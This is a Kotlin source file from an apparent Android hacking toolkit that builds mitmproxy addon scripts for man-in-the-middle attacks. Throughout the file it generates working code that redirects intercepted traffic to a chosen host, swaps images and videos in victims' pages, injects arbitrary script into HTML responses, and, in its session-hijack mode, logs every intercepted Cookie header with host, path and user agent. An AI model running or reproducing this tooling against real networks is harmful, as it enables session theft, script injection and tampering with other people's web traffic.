package org.fsploit.android.data.mitm

import org.fsploit.android.R
import org.fsploit.android.core.ResourceProvider
import org.fsploit.android.domain.model.MitmLaunchRequest
import org.fsploit.android.domain.model.MitmMode
import java.net.URL

class MitmdumpAddonFactory(
    private val resourceProvider: ResourceProvider
) {
    fun build(request: MitmLaunchRequest, artifactPath: String): String {
        return when (request.mode) {
            MitmMode.REDIRECT -> buildRedirectAddon(request)
            MitmMode.IMAGE_REPLACE -> buildImageReplaceAddon(request)
            MitmMode.VIDEO_REPLACE -> buildVideoReplaceAddon(request)
            MitmMode.SCRIPT_INJECTION -> buildScriptInjectionAddon(request)
            MitmMode.CUSTOM_FILTER -> buildCustomFilterAddon(request)
            MitmMode.SESSION_HIJACK -> buildSessionHijackAddon(artifactPath)
            else -> throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_mode_not_supported))
        }
    }

    private fun buildRedirectAddon(request: MitmLaunchRequest): String {
        val targetHost = normalizeHostInput(request.primaryValue)
        val targetPort = request.secondaryValue.trim().toIntOrNull()
            ?.takeIf { it in 1..65535 }
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_port_invalid))
        return """
from mitmproxy import http

TARGET_HOST = ${pythonLiteral(targetHost)}
TARGET_PORT = $targetPort

def request(flow: http.HTTPFlow) -> None:
    flow.request.scheme = "http"
    flow.request.host = TARGET_HOST
    flow.request.port = TARGET_PORT
    flow.request.headers["Host"] = TARGET_HOST
""".trimIndent()
    }

    private fun buildImageReplaceAddon(request: MitmLaunchRequest): String {
        val resourceUrl = normalizeUrlInput(request.primaryValue)
        return """
import re
from mitmproxy import http

RESOURCE = ${pythonLiteral(resourceUrl)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "text/css" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    data = re.sub(r'(?i)<img([^/]+)src=(["\'])[^"\']+(["\'])', r'<img\1src=\2' + RESOURCE + r'\3', data)
    data = re.sub(r'(?i)background\s*(:|-)\s*url\s*[\(|:][^\);]+\)?.*', 'background: url(' + RESOURCE + ')', data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildVideoReplaceAddon(request: MitmLaunchRequest): String {
        val videoId = extractYoutubeVideoId(request.primaryValue.trim())
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_video_url_invalid))
        return """
import re
from mitmproxy import http

VIDEO_ID = ${pythonLiteral(videoId)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "javascript" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    data = re.sub(r'(?s)/v=[a-zA-Z0-9_-]+', '/v=' + VIDEO_ID, data)
    data = re.sub(r'(?s)/v/[a-zA-Z0-9_-]+', '/v/' + VIDEO_ID, data)
    data = re.sub(r'(?s)/embed/[a-zA-Z0-9_-]+', '/embed/' + VIDEO_ID, data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildScriptInjectionAddon(request: MitmLaunchRequest): String {
        val payload = request.payloadValue.trim()
        if (payload.isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_script_required))
        }
        return """
import re
from mitmproxy import http

INJECTION = ${pythonLiteral(payload)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    updated = re.sub(r'(?i)</head>', INJECTION + '</head>', data, count=1)
    if updated == data:
        updated = INJECTION + data
    flow.response.set_text(updated)
""".trimIndent()
    }

    private fun buildCustomFilterAddon(request: MitmLaunchRequest): String {
        val rules = request.payloadValue.lines()
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .map { line ->
                val separator = line.indexOf("=>")
                if (separator <= 0 || separator >= line.lastIndex) {
                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rule_invalid, line))
                }
                val pattern = line.substring(0, separator).trim()
                val replacement = line.substring(separator + 2).trim()
                Regex(pattern)
                pattern to replacement
            }
        if (rules.isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_filter_rules_required))
        }
        val pythonRules = rules.joinToString(",\n") { (pattern, replacement) ->
            "    (${pythonLiteral(pattern)}, ${pythonLiteral(replacement)})"
        }
        return """
import re
from mitmproxy import http

REPLACEMENTS = [
$pythonRules
]

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "text/plain" not in content_type and "javascript" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    for pattern, replacement in REPLACEMENTS:
        data = re.sub(pattern, replacement, data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildSessionHijackAddon(artifactPath: String): String {
        return """
import json
import time
from mitmproxy import http

COOKIE_LOG = ${pythonLiteral(artifactPath)}

def request(flow: http.HTTPFlow) -> None:
    cookie = flow.request.headers.get("Cookie")
    if not cookie:
        return
    record = {
        "timestamp": time.time(),
        "host": flow.request.pretty_host,
        "path": flow.request.path,
        "cookie": cookie,
        "user_agent": flow.request.headers.get("User-Agent", "")
    }
    with open(COOKIE_LOG, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(record, ensure_ascii=False) + "\n")
""".trimIndent()
    }

    private fun normalizeUrlInput(value: String): String {
        val normalized = value.trim().let { if (it.startsWith("http")) it else "http://$it" }
        return try {
            URL(normalized).toString()
        } catch (_: Exception) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_url_invalid))
        }
    }

    private fun normalizeHostInput(value: String): String {
        val normalized = value.trim().let { if (it.startsWith("http")) it else "http://$it" }
        return try {
            URL(normalized).host.orEmpty().ifBlank {
                throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_host_invalid))
            }
        } catch (_: Exception) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_host_invalid))
        }
    }

    private fun extractYoutubeVideoId(value: String): String? {
        val pattern = Regex("(?:v=|/v/|/embed/|youtu\\.be/)([A-Za-z0-9_-]{6,})")
        return pattern.find(value)?.groupValues?.getOrNull(1)
    }

    private fun pythonLiteral(value: String): String {
        val escaped = buildString {
            value.forEach { character ->
                when (character) {
                    '\\' -> append("\\\\")
                    '\'' -> append("\\'")
                    '\n' -> append("\\n")
                    '\r' -> append("\\r")
                    '\t' -> append("\\t")
                    else -> append(character)
                }
            }
        }
        return "'$escaped'"
    }
}
